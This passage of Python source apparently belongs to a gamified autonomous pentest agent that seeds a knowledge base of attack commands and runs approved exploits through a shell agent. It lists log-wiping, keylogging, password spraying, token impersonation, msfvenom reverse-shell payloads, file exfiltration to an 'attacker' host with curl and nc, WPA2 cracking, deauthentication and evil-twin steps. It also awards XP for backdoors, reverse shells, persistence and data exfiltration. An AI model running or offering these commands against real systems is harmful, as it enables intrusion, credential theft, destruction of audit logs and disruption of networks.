                "5. Remove logs: find /var/log -name '*.log' -exec truncate -s 0 {} \\;",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "privesc_checklist", {
            "name": "Privilege Escalation Checklist",
            "linux": [
                "sudo -l",
                "find / -perm -4000 2>/dev/null (SUID)",
                "find / -writable -type f 2>/dev/null",
                "cat /etc/crontab",
                "getcap -r / 2>/dev/null",
                "uname -a (kernel version)",
                "cat /etc/ld.so.preload",
                "ls -la /etc/sudoers",
            ],
            "windows": [
                "whoami /priv",
                "systeminfo",
                "sc query",
                "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                "wmic service list brief",
                "net user",
                "net localgroup administrators",
            ],
        }, "mitre"))

        seed.append(("post_exploit", "keylogging", {
            "name": "Keylogging",
            "methods": {
                "meterpreter": "keyscan_start; keyscan_dump; keyscan_stop",
                "linux": "script /tmp/keys.log; or use xinput",
                "windows": "meterpreter keyscan_start",
            },
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "screenshot_capture", {
            "name": "Screenshot Capture",
            "methods": {
                "meterpreter": "screenshot; screenshare",
                "linux": "DISPLAY=:0 import -window root /tmp/screen.png",
                "windows": "meterpreter screenshot",
            },
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "clipboard_hijacking", {
            "name": "Clipboard Monitoring",
            "methods": {
                "meterpreter": "clipboard_monitor_start",
                "linux": "xclip -selection clipboard -o",
            },
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "network_pivot_setup", {
            "name": "Network Pivoting Setup",
            "steps": [
                "1. AutoRoute: run autoroute -s 10.0.0.0/24",
                "2. SOCKS Proxy: use auxiliary/server/socks_proxy",
                "3. SSH Tunnel: ssh -D 1080 user@pivot",
                "4. Chisel: chisel server --reverse; chisel client attacker:8080 R:socks",
                "5. Proxychains: proxychains nmap -sT -Pn internal",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "password_spraying", {
            "name": "Password Spraying",
            "commands": [
                "crackmapexec smb domain -u users.txt -p 'Company2024!' --continue-on-success",
                "crackmapexec ssh targets.txt -u users.txt -p 'Password123!'",
                "hydra -L users.txt -p 'Summer2024!' ssh://{target}",
            ],
            "description": "Try common passwords against all accounts.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "token_impersonation", {
            "name": "Token Impersonation (Windows)",
            "steps": [
                "1. meterpreter > load incognito",
                "2. incognito_list_tokens -u",
                "3. incognito_impersonate_token NT AUTHORITY\\SYSTEM",
                "4. Use impersonated token for access",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "wmi_execution", {
            "name": "WMI Remote Execution",
            "command": "wmiexec.py domain/user:pass@target 'cmd.exe /c whoami > C:\\temp\\out.txt'",
            "description": "Execute commands via WMI without dropping files.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "dcom_exploitation", {
            "name": "DCOM Remote Execution",
            "commands": [
                "dcomexec.py domain/user:pass@target 'cmd.exe /c whoami'",
                "dcomexec.py -object MMC20.Application domain/user:pass@target 'cmd.exe /c whoami'",
            ],
            "description": "Execute via DCOM objects (MMC20.Application, ShellWindows).",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "forced_authentication", {
            "name": "Forced Authentication Attacks",
            "methods": [
                "Responder -I eth0 (capture NTLM from UNC)",
                "PetitPotam.py target attacker ( coerce DC auth)",
                "SpoolSample.exe DC attacker (print spooler coercion)",
                "PrinterBug.py domain/user:pass@target attacker",
            ],
            "description": "Force machines to authenticate to attacker-controlled host.",
            "requires_auth": True,
        }, "mitre"))

        # ══════════════════════════════════════════════════════
        # UTILITY COMMANDS (10)
        # ══════════════════════════════════════════════════════
        seed.append(("utility", "hash_cracking", {
            "name": "Hash Cracking Reference",
            "hash_modes": {
                "md5": "hashcat -m 0 hash.txt rockyou.txt",
                "sha1": "hashcat -m 100 hash.txt rockyou.txt",
                "sha256": "hashcat -m 1400 hash.txt rockyou.txt",
                "bcrypt": "hashcat -m 3200 hash.txt rockyou.txt",
                "ntlm": "hashcat -m 1000 hash.txt rockyou.txt",
                "netntlmv2": "hashcat -m 5600 hash.txt rockyou.txt",
                "kerberos_tgs": "hashcat -m 13100 hash.txt rockyou.txt",
                "kerberos_asrep": "hashcat -m 18200 hash.txt rockyou.txt",
                "sha512crypt": "hashcat -m 1800 hash.txt rockyou.txt",
                "des": "hashcat -m 14000 hash.txt rockyou.txt",
            },
        }, "internal"))

        seed.append(("utility", "file_transfer", {
            "name": "File Transfer Methods",
            "methods": {
                "python_http": "python3 -m http.server 8080",
                "wget": "wget http://attacker:8080/file",
                "curl_upload": "curl -T file http://attacker:8080/upload",
                "scp": "scp file user@attacker:/tmp/",
                "nc_send": "nc -w 3 attacker 4444 < file",
                "nc_receive": "nc -l -p 4444 > file",
                "base64": "base64 file | nc attacker 4444",
            },
        }, "internal"))

        seed.append(("utility", "port_forwarding", {
            "name": "Port Forwarding Methods",
            "methods": {
                "ssh_local": "ssh -L 8080:internal:80 user@pivot",
                "ssh_remote": "ssh -R 8080:localhost:80 user@attacker",
                "ssh_dynamic": "ssh -D 1080 user@pivot",
                "socat": "socat TCP-LISTEN:8080,fork TCP:internal:80",
                "iptables": "iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination internal:80",
                "chisel": "chisel client attacker:8080 R:8080:internal:80",
            },
        }, "internal"))

        seed.append(("utility", "msfvenom_payloads", {
            "name": "MSFvenom Payload Reference",
            "payloads": {
                "linux_reverse_tcp": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf -o payload",
                "windows_reverse_tcp": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o payload.exe",
                "php_reverse_tcp": "msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f raw -o shell.php",
                "jsp_reverse_tcp": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f raw -o shell.jsp",
                "war": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f war -o shell.war",
                "python_reverse_tcp": "msfvenom -p python/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f raw -o shell.py",
                "bash_reverse_tcp": "msfvenom -p cmd/unix/reverse_bash LHOST=attacker LPORT=4444 -f raw -o shell.sh",
            },
            "requires_auth": True,
        }, "mitre"))

        seed.append(("utility", "nmap_pentest_scripts", {
            "name": "Nmap Pentest Scripts",
            "scripts": {
                "smb_vuln": "--script smb-vuln* -p 445",
                "http_vuln": "--script http-vuln* -p 80,443",
                "ssl_vuln": "--script ssl-heartbleed,ssl-poodle,ssl-ccs-injection -p 443",
                "ftp_anon": "--script ftp-anon -p 21",
                "ssh_auth": "--script ssh-auth-methods -p 22",
                "dns_brute": "--script dns-brute",
                "mysql_empty": "--script mysql-empty-password -p 3306",
                "rdp_vuln": "--script rdp-vuln-ms12-020 -p 3389",
                "snmp_brute": "--script snmp-brute -p 161",
            },
        }, "internal"))

        seed.append(("utility", "wordlists", {
            "name": "Wordlist Reference",
            "wordlists": {
                "passwords": "/usr/share/wordlists/rockyou.txt",
                "web_dirs_medium": "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
                "web_dirs_small": "/usr/share/wordlists/dirb/common.txt",
                "web_dirs_big": "/usr/share/wordlists/dirb/big.txt",
                "usernames": "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
                "subdomains": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
                "snmp_community": "/usr/share/seclists/Discovery/SNMP/common_snmp_community_strings.txt",
                "default_pass": "/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt",
            },
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # WIFI ATTACK PATTERNS (10)
        # ══════════════════════════════════════════════════════
        seed.append(("wifi_attack", "wpa2_handshake", {
            "name": "WPA2 Handshake Capture & Crack",
            "steps": [
                "airmon-ng check kill",
                "airmon-ng start wlxc4e984dfb30f",
                "airodump-ng --bssid MAC --channel CH -w /tmp/handshake wlan0mon",
                "aireplay-ng -0 10 -a MAC wlan0mon",
                "aircrack-ng -w rockyou.txt /tmp/handshake-01.cap",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "wpa2_pmkid", {
            "name": "WPA2 PMKID Attack",
            "steps": [
                "hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng --filterlist_ap=MAC --filtermode=2",
                "hcxpcapngtool /tmp/pmkid.pcapng -o /tmp/hashes.txt",
                "hashcat -m 22000 /tmp/hashes.txt rockyou.txt",
            ],
            "description": "No client needed. Captures PMKID directly from AP.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "wps_pixie_dust", {
            "name": "WPS Pixie Dust Attack",
            "command": "reaver -i wlan0mon -b MAC -vv -K 1",
            "description": "Exploit WPS implementations with weak random number generators.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "wps_pin_brute", {
            "name": "WPS PIN Brute Force",
            "command": "reaver -i wlan0mon -b MAC -vv -p 12345670",
            "description": "Brute force 8-digit WPS PIN. Takes 4-10 hours.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "evil_twin", {
            "name": "Evil Twin AP",
            "steps": [
                "airmon-ng start wlxc4e984dfb30f",
                "airbase-ng -e 'FreeWiFi' -c 6 wlan0mon",
                "dnsmasq -C /tmp/dnsmasq.conf",
                "iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE",
                "hostapd /tmp/hostapd.conf",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "karma_attack", {
            "name": "Karma/MANA Attack",
            "description": "Respond to all probe requests with matching SSIDs.",
            "tools": ["hostapd-mana", "eaphammer"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "eap_clone", {
            "name": "WPA2-Enterprise Evil Twin",
            "steps": [
                "hostapd-wpe /tmp/hostapd-wpe.conf",
                "Wait for EAP credentials",
                "hashcat -m 18200 /tmp/hostapd-wpe.log rockyou.txt",
            ],
            "description": "Clone enterprise AP and capture MSCHAPv2 credentials.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "deauth_attack", {
            "name": "Deauthentication Attack",
            "command": "aireplay-ng -0 0 -a {bssid} wlan0mon",
            "description": "Continuous deauth to force all clients to disconnect.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "fragmentation_attack", {
            "name": "Fragmentation Attack",
            "steps": [
                "airmon-ng start wlxc4e984dfb30f",
                "python3 ptw.py wlan0mon MAC",
                "Decrypt packets without knowing key",
            ],
            "description": "Obtain PRGA to decrypt WEP traffic.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "client_isolation_bypass", {
            "name": "Client Isolation Bypass",
            "techniques": [
                "ARP spoofing to redirect traffic through attacker",
                "DHCP starvation to assign attacker as gateway",
                "DNS spoofing to redirect queries",
                "IPv6 router advertisement spoofing",
            ],
            "requires_auth": True,
        }, "mitre"))

        # ══════════════════════════════════════════════════════
        # REPORTING TEMPLATES (5)
        # ══════════════════════════════════════════════════════
        seed.append(("report_template", "pentest_report", {
            "name": "Penetration Test Report Template",
            "sections": [
                "1. Executive Summary",
                "2. Scope & Methodology",
                "3. Findings (Critical → Low)",
                "   - For each finding: Description, Evidence, Impact, Remediation, CVE",
                "4. Attack Narrative (step-by-step)",
                "5. Recommendations",
                "6. Appendices (tools used, scan results, evidence)",
            ],
        }, "internal"))

        seed.append(("report_template", "vuln_report", {
            "name": "Vulnerability Report Template",
            "fields": ["ID", "Title", "Severity", "CVSS", "CWE", "CVE", "Affected", "Description", "Evidence", "Remediation"],
        }, "internal"))

        seed.append(("report_template", "executive_summary", {
            "name": "Executive Summary Template",
            "content": "During [date], a penetration test was conducted against [scope]. [X] critical, [Y] high, [Z] medium vulnerabilities were discovered. The most critical finding allows [impact]. Immediate remediation is recommended for [specific findings].",
        }, "internal"))

        seed.append(("report_template", "network_map_report", {
            "name": "Network Map Report",
            "sections": [
                "Network topology diagram",
                "Device inventory (IP, hostname, OS, type)",
                "Service inventory (port, service, version)",
                "WiFi networks (SSID, BSSID, encryption, signal)",
                "Vulnerability summary per device",
                "Attack surface analysis",
            ],
        }, "internal"))

        seed.append(("report_template", "wifi_report", {
            "name": "WiFi Security Report",
            "sections": [
                "Networks found (SSID, BSSID, channel, encryption)",
                "Open networks (critical risk)",
                "Weak networks (WEP, short WPA2 passwords)",
                "Client devices per network",
                "Handshake capture status",
                "Recommended WPA3 migration",
            ],
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # STAGING / LOGGING ALL TO KNOWLEDGE
        # ══════════════════════════════════════════════════════
        for category, key, value, source in seed:
            self.log_knowledge(category, key, value, source=source)

        logger.info(f"Seeded {len(seed)} knowledge entries (massive)")
        self.save_state()

    def save_state(self):
        """Persist state to disk."""
        try:
            state_file = self._data_dir / "state.json"
            with open(state_file, 'w') as f:
                json.dump({
                    "xp": self._xp,
                    "level": self._level,
                    "total_xp": self._total_xp,
                    "achievements": self._achievements,
                    "streaks": self._streaks,
                    "stats": self._stats,
                }, f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save state: {e}")

        try:
            knowledge_file = self._data_dir / "knowledge.json"
            with open(knowledge_file, 'w') as f:
                json.dump(self._knowledge_log[-5000:], f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save knowledge: {e}")

        try:
            events_file = self._data_dir / "events.json"
            with open(events_file, 'w') as f:
                json.dump(self._event_log[-1000:], f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save events: {e}")

        try:
            mistakes_file = self._data_dir / "mistakes.json"
            with open(mistakes_file, 'w') as f:
                json.dump(self._mistakes[-200:], f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save mistakes: {e}")

    @property
    def state(self) -> TamaState:
        return self._state

    def get_status(self) -> Dict[str, Any]:
        return {
            "state": self._state.value,
            "running": self._running,
            "paused": self._paused,
            "current_phase": self._current_phase,
            "phase_progress": self._phase_progress,
            "pending_notifications": sum(
                1 for n in self._notifications
                if n.needs_auth and n.auth_status == AuthStatus.PENDING
            ),
            "total_notifications": len(self._notifications),
            "pending_exploits": sum(
                1 for e in self._exploit_queue
                if e.auth_status == AuthStatus.PENDING
            ),
            "active_cracks": sum(
                1 for c in self._crack_sessions if c.status == "running"
            ),
            "stats": self._stats,
            "ollama_paused": self._ollama_was_running,
            "current_thought": self._current_thought,
            "thinking_log": self._thinking_log[-5:],
            # Gamification
            "xp": self._xp,
            "level": self._level,
            "level_name": self._get_level_name(),
            "total_xp": self._total_xp,
            "xp_to_next": self._xp_to_next_level(),
            "xp_progress": self._xp_progress(),
            "achievements": self._achievements,
            "achievements_total": len(self.ACHIEVEMENTS),
            "streaks": self._streaks,
            "mistakes_count": len(self._mistakes),
            "knowledge_stats": self.get_knowledge_stats(),
        }

    # ── Gamification Methods ─────────────────────────────────

    def award_xp(self, action: str, amount: int = 0, detail: str = "") -> int:
        """Award XP for an action. Returns actual XP gained (may differ with multipliers)."""
        base = amount or self.XP_WEIGHTS.get(action, 5)

        # Streak bonus: +10% per streak level (max +50%)
        streak_key = action.split("_")[0] if "_" in action else action
        streak = self._streaks.get(streak_key, 0)
        multiplier = 1.0 + min(streak * 0.1, 0.5)
        final_xp = int(base * multiplier)

        self._xp += final_xp
        self._total_xp += final_xp

        # Level up check
        old_level = self._level
        self._level = self._calculate_level()
        leveled_up = self._level > old_level

        # Log the event
        self._event_log.append({
            "type": "xp",
            "action": action,
            "xp": final_xp,
            "base": base,
            "multiplier": round(multiplier, 1),
            "total": self._total_xp,
            "level": self._level,
            "detail": detail,
            "timestamp": time.time(),
        })

        # Keep log manageable
        if len(self._event_log) > 1000:
            self._event_log = self._event_log[-1000:]

        # Check achievements
        self._check_achievements()

        if leveled_up:
            self._event_log.append({
                "type": "level_up",
                "level": self._level,
                "name": self._get_level_name(),
                "timestamp": time.time(),
            })

        logger.info(f"XP awarded: {final_xp} for {action} (total: {self._total_xp}, level: {self._level})")
        self.save_state()
        return final_xp

    def penalize(self, action: str, amount: int = 0, reason: str = ""):
        """Penalize for mistakes (false positives, failures, etc)."""
        base = amount or abs(self.XP_WEIGHTS.get(action, -5))
        penalty = min(base, self._xp)  # Never go below 0
        self._xp -= penalty

        self._mistakes.append({
            "action": action,
            "penalty": penalty,
            "reason": reason,
            "timestamp": time.time(),
        })

        # Keep mistakes log manageable
        if len(self._mistakes) > 200:
            self._mistakes = self._mistakes[-200:]

        self._event_log.append({
            "type": "penalty",
            "action": action,
            "xp": -penalty,
            "reason": reason,
            "timestamp": time.time(),
        })

        logger.info(f"XP penalty: -{penalty} for {action} (reason: {reason})")
        return penalty

    def record_mistake(self, action: str, expected: str, actual: str):
        """Record a classification/prediction mistake for learning."""
        self._mistakes.append({
            "action": action,
            "expected": expected,
            "actual": actual,
            "timestamp": time.time(),
            "learned": False,
        })
        self.penalize("wrong_classification", reason=f"Expected {expected}, got {actual}")

    def get_learning_data(self) -> Dict[str, Any]:
        """Get data about mistakes and learning progress."""
        unlearned = [m for m in self._mistakes if not m.get("learned")]
        return {
            "total_mistakes": len(self._mistakes),
            "unlearned": len(unlearned),
            "recent_mistakes": self._mistakes[-10:],
            "learning_rate": 1.0 - (len(unlearned) / max(len(self._mistakes), 1)),
            "categories": self._mistake_categories(),
        }

    def _mistake_categories(self) -> Dict[str, int]:
        """Count mistakes by category."""
        cats = {}
        for m in self._mistakes:
            cat = m.get("action", "unknown")
            cats[cat] = cats.get(cat, 0) + 1
        return cats

    def _calculate_level(self) -> int:
        """Calculate level from total XP."""
        level = 1
        for i, threshold in enumerate(self.LEVEL_XP):
            if self._total_xp >= threshold:
                level = i + 1
            else:
                break
        return min(level, len(self.LEVEL_XP))

    def _get_level_name(self) -> str:
        idx = min(self._level - 1, len(self.LEVEL_NAMES) - 1)
        return self.LEVEL_NAMES[idx]

    def _xp_to_next_level(self) -> int:
        if self._level >= len(self.LEVEL_XP):
            return 0
        return self.LEVEL_XP[self._level] - self._total_xp

    def _xp_progress(self) -> float:
        if self._level >= len(self.LEVEL_XP):
            return 1.0
        current = self.LEVEL_XP[self._level - 1] if self._level > 1 else 0
        nxt = self.LEVEL_XP[self._level]
        return (self._total_xp - current) / max(nxt - current, 1)

    def _check_achievements(self):
        """Check and award achievements."""
        new_achievements = []

        def try_achieve(key):
            if key not in self._achievements:
                if key not in self.ACHIEVEMENTS:
                    return
                ach = self.ACHIEVEMENTS[key]
                self._achievements.append(key)
                new_achievements.append(ach)
                self._event_log.append({
                    "type": "achievement",
                    "key": key,
                    "name": ach["name"],
                    "desc": ach["desc"],
                    "icon": ach["icon"],
                    "xp": ach["xp"],
                    "timestamp": time.time(),
                })

        s = self._stats

        # ── Discovery ──
        if s["scans_run"] >= 1:
            try_achieve("first_scan")
        if s["devices_found"] >= 1:
            try_achieve("first_device")
        if s["vulns_found"] >= 1:
            try_achieve("first_vuln")
        if s["devices_found"] >= 10:
            try_achieve("ten_devices")
        if s["devices_found"] >= 50:
            try_achieve("fifty_devices")
        if s["vulns_found"] >= 10:
            try_achieve("ten_vulns")

        # ── Exploitation ──
        if s["exploits_executed"] >= 1:
            try_achieve("first_exploit")
        if s["access_gained"] >= 1:
            try_achieve("first_access")
        if s["access_gained"] >= 5:
            try_achieve("five_access")
        if s["access_gained"] >= 10:
            try_achieve("ten_access")
        if s["backdoors_installed"] >= 1:
            try_achieve("first_backdoor")
        if s["backdoors_installed"] >= 5:
            try_achieve("five_backdoors")
        if s["reverse_shells"] >= 1:
            try_achieve("first_reverse_shell")
        if s["privilege_escalations"] >= 1:
            try_achieve("first_priv_esc")
        if s["privilege_escalations"] >= 5:
            try_achieve("five_priv_esc")
        if s["lateral_movements"] >= 1:
            try_achieve("first_lateral")
        if s["data_exfiltrations"] >= 1:
            try_achieve("first_exfil")

        # ── WiFi ──
        if s["cracks_run"] >= 1:
            try_achieve("first_crack")
        if s["handshakes_captured"] >= 1:
            try_achieve("first_handshake")
        if s["handshakes_captured"] >= 10:
            try_achieve("ten_handshakes")
        if s["wifi_cracks"] >= 1:
            try_achieve("first_wpa_crack")
        if s["wifi_deauths"] >= 1:
            try_achieve("first_deauth")
        if s["evil_twins"] >= 1:
            try_achieve("first_evil_twin")

        # ── Credentials ──
        if s["hashes_cracked"] >= 1:
            try_achieve("first_hash_crack")
        if s["hashes_cracked"] >= 10:
            try_achieve("ten_hashes")
        if s["kerberoasts"] >= 1:
            try_achieve("first_kerberoast")
        if s["credentials_harvested"] >= 3:
            try_achieve("default_creds_hunter")

        # ── Persistence ──
        if s["persistence_established"] >= 1:
            try_achieve("first_persistence")
        if s["persistence_established"] >= 3:
            try_achieve("three_persistence")
        if s["mitm_attacks"] >= 1:
            try_achieve("first_mitm")
        if s["pivot_count"] >= 1:
            try_achieve("first_pivot")

        # ── XP Milestones ──
        if self._total_xp >= 100:
            try_achieve("hundred_xp")
        if self._total_xp >= 1000:
            try_achieve("thousand_xp")
        if self._total_xp >= 5000:
            try_achieve("five_thousand_xp")
        if self._total_xp >= 10000:
            try_achieve("ten_thousand_xp")

        # ── Level Milestones ──
        if self._level >= 5:
            try_achieve("level_5")
        if self._level >= 10:
            try_achieve("level_10")
        if self._level >= 15:
            try_achieve("level_15")
        if self._level >= 20:
            try_achieve("level_20")

        # ── Time-based ──
        hour = time.localtime().tm_hour
        if 2 <= hour <= 5 and s["scans_run"] > 0:
            try_achieve("night_owl")
        if 2 <= hour <= 5 and s.get("cycle_count", 0) >= 5:
            try_achieve("night_stalker")

        for ach in new_achievements:
            self.award_xp("achievement_unlocked", ach["xp"], ach["name"])

    # ── Authorization Logic ───────────────────────────────────

    def needs_authorization(self, command: str) -> bool:
        """Check if a command requires user authorization."""
        cmd_lower = command.lower()

        # Always safe commands don't need auth
        for pattern in self.SAFE_PATTERNS:
            if pattern in cmd_lower:
                return False

        # Check if command matches auth-required patterns
        for pattern in self.AUTH_REQUIRED_PATTERNS:
            if pattern in cmd_lower:
                return True

        return False

    def _create_vuln_notification(self, ip: str, port: int, vuln_type: str, severity: str, message: str):
        """Create a vulnerability notification from analysis."""
        # Deduplicate: don't re-create same vuln for same ip:port
        for n in self._notifications:
            if n.target == f"{ip}:{port}" and n.type == NotificationType.VULN_FOUND:
                return
        self.create_notification(
            NotificationType.VULN_FOUND,
            f"{vuln_type.replace('_', ' ').title()}: {ip}:{port}",
            message,
            target=f"{ip}:{port}",
            severity=severity,
        )
        self._stats["vulns_found"] += 1
        self.award_xp("vuln_found", detail=f"{vuln_type} on {ip}:{port}")

    def create_notification(
        self,
        ntype: NotificationType,
        title: str,
        message: str,
        target: str = "",
        severity: str = "info",
        needs_auth: bool = False,
        exploit_cmd: Optional[str] = None,
    ) -> Notification:
        """Create a notification (and optionally an exploit task)."""
        notif = Notification(
            type=ntype,
            title=title,
            message=message,
            target=target,
            severity=severity,
            needs_auth=needs_auth,
            exploit_cmd=exploit_cmd,
        )
        if needs_auth:
            notif.auth_status = AuthStatus.PENDING

        self._notifications.append(notif)
        self._stats["notifications_created"] += 1

        if exploit_cmd:
            task = ExploitTask(
                target=target,
                command=exploit_cmd,
                needs_auth=needs_auth,
                auth_status=notif.auth_status,
            )
            self._exploit_queue.append(task)

        logger.info(f"Notification: [{ntype.value}] {title} (auth={needs_auth})")
        return notif

    def authorize_notification(self, notification_id: str) -> bool:
        """Authorize a pending notification/exploit."""
        for notif in self._notifications:
            if notif.id == notification_id and notif.needs_auth:
                notif.auth_status = AuthStatus.APPROVED
                notif.auth_at = time.time()
                self._stats["authorizations_granted"] += 1

                # Also approve linked exploit task
                for task in self._exploit_queue:
                    if task.command == notif.exploit_cmd:
                        task.auth_status = AuthStatus.APPROVED

                logger.info(f"Authorized: {notif.title}")
                return True
        return False

    def deny_notification(self, notification_id: str) -> bool:
        """Deny a pending notification."""
        for notif in self._notifications:
            if notif.id == notification_id and notif.needs_auth:
                notif.auth_status = AuthStatus.DENIED
                notif.auth_at = time.time()

                for task in self._exploit_queue:
                    if task.command == notif.exploit_cmd:
                        task.auth_status = AuthStatus.DENIED

                logger.info(f"Denied: {notif.title}")
                return True
        return False

    # ── Knowledge Growth ──────────────────────────────────────

    def log_knowledge(self, category: str, key: str, value: Any, source: str = ""):
        """Log a piece of knowledge for future reference."""
        entry = {
            "category": category,
            "key": key,
            "value": value,
            "source": source,
            "timestamp": time.time(),
        }
        self._knowledge_log.append(entry)

        # Keep knowledge log manageable
        if len(self._knowledge_log) > 5000:
            self._knowledge_log = self._knowledge_log[-5000:]

        # Persist every 10 new entries to avoid excessive I/O
        if len(self._knowledge_log) % 10 == 0:
            self.save_state()

    def get_knowledge(self, category: Optional[str] = None, limit: int = 50) -> List[Dict]:
        """Get knowledge entries, optionally filtered by category."""
        entries = self._knowledge_log
        if category:
            entries = [e for e in entries if e["category"] == category]
        return entries[-limit:]

    def get_knowledge_stats(self) -> Dict[str, int]:
        """Get knowledge stats by category."""
        stats = {}
        for entry in self._knowledge_log:
            cat = entry["category"]
            stats[cat] = stats.get(cat, 0) + 1
        return stats

    # ── Crack Management ──────────────────────────────────────

    async def _pause_ollama(self):
        """Pause Ollama to free GPU for hashcat."""
        try:
            result = subprocess.run(
                ["pgrep", "-f", "ollama"],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                pids = result.stdout.strip().split("\n")
                for pid_str in pids:
                    if pid_str.strip():
                        pid = int(pid_str.strip())
                        os.kill(pid, signal.SIGSTOP)
                        self._ollama_pid = pid
                        self._ollama_was_running = True
                        logger.info(f"Paused Ollama (PID {pid}) for GPU cracking")
                        return True
        except Exception as e:
            logger.warning(f"Could not pause Ollama: {e}")
        return False

    async def _resume_ollama(self):
        """Resume Ollama after cracking."""
        if self._ollama_pid and self._ollama_was_running:
            try:
                os.kill(self._ollama_pid, signal.SIGCONT)
                logger.info(f"Resumed Ollama (PID {self._ollama_pid})")
            except Exception as e:
                logger.warning(f"Could not resume Ollama: {e}")
            self._ollama_pid = None
            self._ollama_was_running = False

    async def start_crack(self, hash_file: str, tool: str = "john", gpu: bool = False) -> CrackSession:
        """Start a cracking session."""
        session = CrackSession(
            tool=tool,
            hash_file=hash_file,
            gpu_mode=gpu,
            status="starting",
        )

        if gpu and tool == "hashcat":
            await self._pause_ollama()

        self._crack_sessions.append(session)
        self._stats["cracks_run"] += 1

        # Build command
        if tool == "john":
            cmd = f"john {hash_file}"
        elif tool == "hashcat":
            mode = "0"  # default hash mode
            cmd = f"hashcat -m {mode} {hash_file} /usr/share/wordlists/rockyou.txt"
        else:
            cmd = f"{tool} {hash_file}"

        session.status = "running"
        session.started_at = time.time()

        # Run in background
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            session.pid = proc.pid
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=3600)
            session.result = stdout.decode("utf-8", errors="replace")
            session.status = "completed"
            session.completed_at = time.time()
        except asyncio.TimeoutError:
            session.status = "timeout"
            session.result = "Cracking session timed out after 1 hour"
            try:
                if proc and proc.returncode is None:
                    proc.kill()
                    await proc.wait()
                    logger.info(f"Killed orphaned cracking process PID={session.pid}")
            except Exception:
                pass
        except Exception as e:
            session.status = "error"
            session.result = str(e)
        finally:
            if gpu:
                await self._resume_ollama()

        self.create_notification(
            NotificationType.CRACK_COMPLETE,
            "Cracking Complete",
            f"Tool: {tool}, Status: {session.status}",
            target=hash_file,
        )

        return session

    # ── Exploit Prioritization ────────────────────────────────

    def prioritize_exploits(self) -> List[ExploitTask]:
        """Sort exploit queue by priority and CVSS score."""
        pending = [
            t for t in self._exploit_queue
            if t.auth_status in (AuthStatus.PENDING, AuthStatus.APPROVED)
            and not t.executed
        ]
        pending.sort(key=lambda t: (-t.priority, -t.cvss))
        return pending

    async def execute_authorized_exploits(self, shell_agent):
        """Execute all authorized exploits."""
        for task in self.prioritize_exploits():
            if task.auth_status == AuthStatus.APPROVED:
                self._state = TamaState.EXPLOITING
                logger.info(f"Executing authorized exploit: {task.command}")

                from agents.base import AgentMessage
                msg = AgentMessage(
                    sender="tamagotchi",
                    receiver="Shell",
                    content=f"!{task.command}",
                    metadata={"tamagotchi_exploit": True, "task_id": task.id},
                )
                result = await shell_agent.handle(msg)
                task.executed = True
                task.result = result.content
                self._stats["exploits_executed"] += 1

                self.log_knowledge(
                    "exploit",
                    task.exploit_name or task.command[:100],
                    {"target": task.target, "result": result.content[:500]},
                    source="tamagotchi",
                )

    # ── Learning from Discoveries ──────────────────────────────

    def learn_from_device(self, device: Dict[str, Any]):
        """Extract and store knowledge from a discovered device."""
        ip = device.get("ip", "")
        services = device.get("services", [])

        for svc in services:
            name = svc.get("name", "")
            version = svc.get("version", "")

            if version:
                self.log_knowledge(
                    "service_version",
                    f"{ip}:{svc.get('port')}",
                    {"service": name, "version": version},
                    source="sentient",
                )

            # Check for known vulnerable versions
            if name in ("http", "https") and version:
                self.log_knowledge(
                    "web_service",
                    ip,
                    {"port": svc.get("port"), "version": version},
                    source="sentient",
                )

        # Log the device itself
        self.log_knowledge(
            "device",
            ip,
            {
                "hostname": device.get("hostname", ""),
                "type": device.get("device_type", "unknown"),
                "services": len(services),
            },
            source="sentient",
        )

    # ── Prompt Suggestions ────────────────────────────────────

    def get_prompt_suggestions(self) -> List[Dict[str, str]]:
        """Get contextual prompt suggestions based on current state."""
        suggestions = []

        # Always-available suggestions
        suggestions.extend([
            {"text": "Scan my network", "category": "recon", "icon": "radar"},
